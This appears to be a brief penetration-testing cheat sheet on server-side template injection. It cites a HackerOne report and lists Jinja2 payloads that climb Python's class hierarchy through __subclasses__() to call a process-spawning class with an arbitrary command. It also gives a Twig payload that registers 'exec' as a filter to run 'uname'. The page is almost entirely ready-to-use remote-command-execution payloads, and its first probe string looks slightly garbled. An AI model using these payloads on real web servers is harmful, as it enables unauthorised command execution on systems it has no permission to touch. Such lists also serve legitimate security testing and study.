# SSTI

Server Side Template Injection - ```{{'7*'7}}```.  See https://hackerone.com/reports/125980 for an example.

```python
example.com/{{''.__class__.mro()[1].__subclasses__()}}
example.com/{{''.__class__.mro()[1].__subclasses__()[X]}}          # X = int
example.com{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} # COMMAND = choose your own adventure

{{''.__class__.mro()[2].__subclasses__()[233](["command", "argument"])}}
# the [] at the end creates an array
```

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```



